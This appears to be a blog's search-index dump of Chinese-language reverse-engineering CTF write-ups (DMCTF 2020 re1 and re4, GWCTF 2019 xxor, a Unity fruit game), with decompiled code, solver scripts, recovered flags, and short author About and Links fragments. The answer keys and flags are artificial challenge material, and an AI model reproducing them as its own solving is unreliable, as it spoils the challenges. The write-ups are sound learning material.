Encoding.UTF8.GetBytes(str); byte[] array = SHA1.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\"X2\")); } return stringBuilder.ToString(); } // Token: 0x0600000C RID: 12 RVA: 0x000021C8 File Offset: 0x000003C8 public void Spawn() { FruitSpawner component = GameObject.FindWithTag(\"GameController\").GetComponent\u003cFruitSpawner\u003e(); if (component) { if (this.audioSources.Length != 0) { this.audioSources[Random.Range(0, this.audioSources.Length)].Play(); } component.Spawn(this.toSpawn); string name = this.toSpawn.name; if (name == \"汉堡底\" \u0026\u0026 Init.spawnCount == 0) { Init.secret += 997; } else if (name == \"鸭屁股\") { Init.secret -= 127; } else if (name == \"胡罗贝\") { Init.secret *= 3; } else if (name == \"臭豆腐\") { Init.secret ^= 18; } else if (name == \"俘虏\") { Init.secret += 29; } else if (name == \"白拆\") { Init.secret -= 47; } else if (name == \"美汁汁\") { Init.secret *= 5; } else if (name == \"柠檬\") { Init.secret ^= 87; } else if (name == \"汉堡顶\" \u0026\u0026 Init.spawnCount == 5) { Init.secret ^= 127; string str = Init.secret.ToString(); if (ButtonSpawnFruit.Sha1(str) == \"DD01903921EA24941C26A48F2CEC24E0BB0E8CC7\") { this.result = \"BJDCTF{\" + ButtonSpawnFruit.Md5(str) + \"}\"; Debug.Log(this.result); } } Init.spawnCount++; Debug.Log(Init.secret); Debug.Log(Init.spawnCount); } } 基本思路是已知sha1(str)==DD01903921EA24941C26A48F2CEC24E0BB0E8CC7,求md5(str) 还是根据题解上cmd5.com得str==1001 然后md5加密，注意这一句，取加密后的0-20（不包括20）即前20位（前人之鉴属于是 return stringBuilder.ToString().Substring(0, 20) ipython跑一遍得flag In [1]: from hashlib import md5 In [2]: a=md5() In [3]: a.update(b\"1001\") In [4]: print(\"BJDCTF{\"+a.hexdigest()[:20]+\"}\") BJDCTF{b8c37e33defde51cf91e} 总结：这周题真是给我开眼界的（ 第一周 2021-10-31 写在前面： 新人第一次发帖，多多指教 长篇幅警告，写得比较繁琐 主要记录自己的做题过程，当然还有水水水 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:19:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 DMCTF 2020 re1 来点简单的算法甜点 解压后只有一个exe文件，先运行看看 提示输入flag，乱输提示 wrong flag！ flag:134123421 wrong flag! 请按任意键继续. . . 拖进die，无壳，进ida 看不懂汇编，直接F5，进main_0函数 int __cdecl main_0(int argc, const char **argv, const char **envp) { char Str; // [esp+DCh] [ebp-40h] BYREF char v5[54]; // [esp+DDh] [ebp-3Fh] BYREF __CheckForDebuggerJustMyCode(\u0026unk_5E0029); Str = 0; j__memset(v5, 0, sizeof(v5)); sub_485257(\"flag:\"); sub_484CF3(\u0026dword_5DD268, \u0026Str); if ( sub_485D1A(\u0026Str) ) sub_4849EC(\u0026Str); else sub_485257(\"wrong flag!\\n\"); sub_488209(\"pause\"); return 0; } 发现有用的主要在if else 先进if判断条件函数sub_485D1A BOOL __cdecl sub_49BE80(char *Str) { __CheckForDebuggerJustMyCode(\u0026unk_5E0029); return j__strlen(Str) == 20; } 第一行看不懂也感觉没用，直接忽略，第二行限制输入为20个字符 回来再进if下函数sub_4849EC int __cdecl sub_49AE10(char *Str1) { int result; // eax int i; // [esp+D0h] [ebp-2Ch] char Str2[28]; // [esp+DCh] [ebp-20h] BYREF __CheckForDebuggerJustMyCode(\u0026unk_5E0029); strcpy(Str2, \"fmesh{umkc_vlrn_glh}\"); for ( i = 0; i \u003c= 19; ++i ) { if ( Str1[i] \u003c 97 || Str1[i] \u003e= 108 ) { if ( Str1[i] \u003e 110 \u0026\u0026 Str1[i] \u003c= 122 ) --Str1[i]; } else { Str1[i] += 2; } } if ( !j__strcmp(Str1, Str2) ) result = sub_485257(\"congratulations!\\n\"); else result = sub_485257(\"wrong flag!\\n\"); return result; } 发现是个简单的加密 加改成减，减改成加，逆写得到flag，粘个代码 #include\u003ccstdio\u003e char Str1[]=\"fmesh{umkc_vlrn_glh}\"; int main(){ for(int i=0;i\u003c=19;i++){ if ( Str1[i] \u003c 97 || Str1[i] \u003e= 108 ){ if ( Str1[i] \u003e 110 \u0026\u0026 Str1[i] \u003c= 122 ) Str1[i]++; } else{ Str1[i] -= 2; } } puts(Str1); } //flag:dmctf{vmia_wlsn_elf} 然而据说这题多解，咱也不知道，咱也不敢问 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:20:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 DMCTF 2020 re4 “最短路径” 直接打开exe，输入key闪退差评 cmd打开 C:\\Users\\DX3906\u003eD:\\DX3906\\下载\\12345\\12345.exe key:1234123 failed. failed. failed. failed. failed. failed. failed. failed. 8个failed直呼好狠 die查壳：无，拖进ida 直接F5，找不到主函数 void __noreturn start() { _set_app_type(_crt_console_app); sub_4011B0(); } 打开string窗口 .rdata:00405000 00000013 C libgcc_s_dw2-1.dll .rdata:00405013 00000016 C __register_frame_info .rdata:00405029 00000018 C __deregister_frame_info .rdata:00405041 0000000E C libgcj-16.dll .rdata:0040504F 00000014 C _Jv_RegisterClasses .rdata:0040506A 00000008 C failed. .rdata:00405072 0000000A C flag{%s}\\n .rdata:00405080 00000018 C Mingw runtime failure:\\n .rdata:00405098 00000031 C VirtualQuery failed for %d bytes at address %p .rdata:004050CC 00000032 C Unknown pseudo relocation protocol version %d.\\n .rdata:00405100 0000002A C Unknown pseudo relocation bit size %d.\\n 映入眼帘就是failed 点他—— rdata:0040506A Buffer db 'failed.',0 ; DATA XREF: sub_401460:loc_4015A3↑o 发现函数sub_401460，点他弹出来汇编，再F5，终于进了真的主函数 int sub_401460() { int v0; // eax char Buffer[51]; // [esp+3Dh] [ebp-43h] BYREF int v3; // [esp+70h] [ebp-10h] int i; // [esp+74h] [ebp-Ch] int v5; // [esp+78h] [ebp-8h] int v6; // [esp+7Ch] [ebp-4h] sub_401BD0(); printf(\"key:\"); fgets(Buffer, 50, (FILE *)iob[0]._ptr); v3 = strlen(Buffer); if ( Buffer[v3 - 1] == 10 ) Buffer[v3 - 1] = 0; --v3; v6 = 0; v5 = 0; for ( i = 0; i \u003c v3; ++i ) { v0 = Buffer[i]; if ( v0 == 0x31 ) { --v5; } else if ( v0 \u003e 49 ) { if ( v0 == 50 ) { ++v6; } else { if ( v0 != 51 ) { LABEL_16: puts(\"failed.\"); goto LABEL_17; } --v6; } } else { if ( v0 != 48 ) goto LABEL_16; ++v5; } LABEL_17: if ( !byte_404020[10 * v6 + v5] || v6 \u003c 0 || v5 \u003c 0 || v6 \u003e 9 || v5 \u003e 9 ) puts(\"failed.\"); } if ( v6 == 9 \u0026\u0026 v5 == 9 ) printf(\"flag{%s}\\n\", Buffer); return 0; } 观察LABEL_17中if的判断条件，咋看咋像迷宫题，v6表示行，v5表示列，0-9共10行10列 进数组byte_404020，数据都是0和1，更加确信迷宫 .data:00404020 byte_404020 db 1 ; DATA XREF: sub_401460+164↑r .data:00404021 db 0 .data:00404022 db 0 .data:00404023 db 0 .data:00404024 db 0 .data:00404025 db 1 .data:00404026 db 1 .data:00404027 db 0 .data:00404028 db 0 .data:00404029 db 0 .data:0040402A db 1 .data:0040402B db 1 .data:0040402C db 0 .data:0040402D db 0 .data:0040402E db 0 .data:0040402F db 1 .data:00404030 db 1 .data:00404031 db 1 .data:00404032 db 0 但，这要我一个个扣出来？？ 右键选择Array 然后把size改成100（10行10列共100个数 舒服~ .data:00404020 byte_404020 db 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1; 0 .data:00404020 ; DATA XREF: sub_401460+164↑r .data:00404020 db 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1; 18 .data:00404020 db 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0; 36 .data:00404020 db 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0; 54 .data:00404020 db 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1; 72 .data:00404020 db 0, 0, 0, 0, 0, 0, 0, 0, 0, 1; 90 复制粘贴出迷宫 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 回头再看函数 for ( i = 0; i \u003c v3; ++i ) { v0 = Buffer[i]; if ( v0 == 0x31 ) { --v5; } else if ( v0 \u003e 49 ) { if ( v0 == 50 ) { ++v6; } else { if ( v0 != 51 ) { LABEL_16: puts(\"failed.\"); goto LABEL_17; } --v6; } } else { if ( v0 != 48 ) goto LABEL_16; ++v5; } LABEL_17: if ( !byte_404020[10 * v6 + v5] || v6 \u003c 0 || v5 \u003c 0 || v6 \u003e 9 || v5 \u003e 9 ) puts(\"failed.\"); } 易得 0 ++v5 right 1 --v5 left 2 ++v6 down 3 --v6 up 手动走迷宫得 key:20220002033330202222202202 回cmd运行得flag key:20220002033330202222202202 flag{20220002033330202222202202} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:20:1","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 GWCTF 2019 xxor 快乐的解方程题目 解压打开发现不是exe，无法打开直接拖die 发现是elf64（linux可执行文件），马上去开虚拟机 ubuntu里先运行一下 dx3906@ubuntu:~/Desktop$ '/home/dx3906/attachment' Let us play a game? you have six chances to input Come on! input: 1231212 input: 3 input: 12 input: 3 input: 12 input: 3 Wrong! NO NO NO~ 发现题目需要输入六次，拖ida F5 在左边Functions Window找到了main函数，竟然是真的 __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] __int64 v6[6]; // [rsp+10h] [rbp-60h] BYREF __int64 v7[6]; // [rsp+40h] [rbp-30h] BYREF v7[5] = __readfsqword(0x28u); puts(\"Let us play a game?\"); puts(\"you have six chances to input\"); puts(\"Come on!\"); v6[0] = 0LL; v6[1] = 0LL; v6[2] = 0LL; v6[3] = 0LL; v6[4] = 0LL; for ( i = 0; i \u003c= 5; ++i ) { printf(\"%s\", \"input: \"); __isoc99_scanf(\"%d\", (char *)v6 + 4 * i); } v7[0] = 0LL; v7[1] = 0LL; v7[2] = 0LL; v7[3] = 0LL; v7[4] = 0LL; for ( j = 0; j \u003c= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); sub_400686(\u0026dword_601078, \u0026unk_601060); LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } if ( (unsigned int)sub_400770(v7) != 1 ) { puts(\"NO NO NO~ \"); exit(0); } puts(\"Congratulation!\\n\"); puts(\"You seccess half\\n\"); puts(\"Do not forget to change input to hex and combine~\\n\"); puts(\"ByeBye\"); return 0LL; } 倒着看，先进if里面的判断函数sub_400770(v7) __int64 __fastcall sub_400770(_DWORD *a1) { __int64 result; // rax if ( a1[2] - a1[3] == 0x84A236FFLL \u0026\u0026 a1[3] + a1[4] == 0xFA6CB703LL \u0026\u0026 a1[2] - a1[4] == 0x42D731A8LL \u0026\u0026 *a1 == 0xDF48EF7E \u0026\u0026 a1[5] == 0x84F30420 \u0026\u0026 a1[1] == 0x20CAACF4 ) { puts(\"good!\"); result = 1LL; } else { puts(\"Wrong!\"); result = 0LL; } return result; } 果然如题目解方程，z3搞它 from z3 import * a = Int('a') b = Int('b') c = Int('c') d = Int('d') e = Int('e') f = Int('f') s = Solver() s.add(a == 0xDF48EF7E) s.add(b == 0x20CAACF4) s.add(f == 0x84F30420) s.add(c-d == 0x84A236FF) s.add(d+e == 0xFA6CB703) s.add(c-e == 0x42D731A8) print(s.check()) print(s.model()) a-f表示a1的0-5，z3里不会定义数组，干脆用字母，会的佬教一下孩子 得到结果 sat [c = 3774025685, d = 1548802262, e = 2652626477, f = 2230518816, b = 550153460, a = 3746099070] 但这还没完（要是光解方程可能也做不了第三题 解出来的是加密后的input，加密算法如下 for ( j = 0; j \u003c= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); sub_400686(\u0026dword_601078, \u0026unk_601060); LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } 基本是把高四字节（HIDWORD）和低四字节（LODWORD）分开一顿操作，进函数sub_400686 __int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2) { __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i \u003c= 0x3F; ++i ) { v5 += 0x458BCD42; v3 += (v4 + v5 + 11) ^ ((v4 \u003c\u003c 6) + *a2) ^ ((v4 \u003e\u003e 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 \u003c\u003c 6) + a2[2]) ^ ((v3 \u003e\u003e 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result; } 感觉好像我的二面题，tea加密？ 变量只有v3，v4，且求v3时v4已知，求v4时v3已知 结论：可逆，难点在于各种数据类型容易把自己搞晕 注意主函数input格式控制为%d，故用int存flag __isoc99_scanf(\"%d\", (char *)v6 + 4 * i); 完整代码 #include\u003ccstdio\u003e unsigned int flag[100],a1[]={3746099070,550153460,3774025685,1548802262,2652626477,2230518816}; unsigned long long a2[10]; unsigned int key[5]={2,2,3,4}; int v5; int main(){ for(int i=0;i\u003c3;i++){ a2[i]=*((unsigned long long*)a1+i); } for(int i=0;i\u003c3;i++){ unsigned int xl=*((unsigned int*)\u0026a2[i]);//低位 unsigned int xh=*((unsigned int*)\u0026a2[i]+1);//高位 for(int j=0x3F;j\u003e=0;j--){ v5=(j+1)*0x458BCD42; xh-=(xl+v5+20)^((xl\u003c\u003c6)+key[2])^((xl\u003e\u003e9)+key[3])^0x10; xl-=(xh+v5+11)^((xh\u003c\u003c6)+key[0])^((xh\u003e\u003e9)+key[1])^0x20; } flag[2*i]=xl; flag[2*i+1]=xh; } for(int i=0;i\u003c6;i++){ printf(\"%d\\n\",flag[i]); } } 输出6个数字 6712417 6781810 6643561 7561063 7497057 7610749 回 Ubuntu input dx3906@ubuntu:~/Desktop$ '/home/dx3906/attachment' Let us play a game? you have six chances to input Come on! input: 6712417 input: 6781810 input: 6643561 input: 7561063 input: 7497057 input: 7610749 good! Congratulation! You seccess half Do not forget to change input to hex and combine~ ByeB","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:21:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":null,"content":"About ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Hi there 👋 This is DX3906 A student from Xidian University, major in Cyberspace Security. CTFer(mainly Reverse Engineering) in XDSEC/L-team. Learning: binary security \u0026 web developing \u0026 Devops Blog: DX3906’s blog email: dx390611@gmail.com github: https://github.com/DX39061 ","date":"0001-01-01","objectID":"/about/:0:1","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"吾辈所赴，是为星辰大海 ","date":"0001-01-01","objectID":"/about/:0:2","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Friends 欢迎留言交换友链！ Reverier-Xu 云之君 track 果果 含树 d33b4t0 Frank P.Z. shallow doctor3 ","date":"0001-01-01","objectID":"/links/:0:0","tags":null,"title":"","uri":"/links/"}]